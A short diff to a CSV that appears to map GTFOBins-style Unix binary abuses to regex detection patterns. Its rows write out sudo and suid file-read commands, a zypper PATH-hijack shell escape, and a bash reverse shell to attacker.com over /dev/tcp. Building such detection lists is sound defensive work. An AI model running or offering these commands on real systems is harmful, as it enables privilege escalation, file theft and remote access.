@@ -121,7 +121,6 @@ basenc,sudo,sudo basenc --base64 $LFILE | basenc -d --base64,(?i)(?:sudo\s+)?(?:
 basez,file-read,"basez ""$LFILE"" | basez --decode",(?i)(?:sudo\s+)?(?:\S*/)?basez\s+.*)
 basez,suid,"./basez ""$LFILE"" | basez --decode",(?i)(?:sudo\s+)?(?:\S*/)?basez\s+.*)
 basez,sudo,"sudo basez ""$LFILE"" | basez --decode",(?i)(?:sudo\s+)?(?:\S*/)?basez\s+.*)
-bash,shell,bash,(?i)(?:sudo\s+)?(?:\S*/)?bash\s+.*)
 bash,reverse-shell,"export RHOST=attacker.com
 export RPORT=12345
 bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s*\-c\s*\-i\s+.*)
@@ -2641,3 +2640,4 @@ zypper x",(?i)(?:sudo\s+)?(?:\S*/)?zypper\s+.*/bin/sh)
 zypper,sudo,sudo zypper x,(?i)(?:sudo\s+)?(?:\S*/)?zypper\s+.*)
 zypper,sudo,"cp /bin/sh $TF/zypper-x
 sudo PATH=$TF:$PATH zypper x",(?i)(?:sudo\s+)?(?:\S*/)?zypper\s+.*/bin/sh)
+
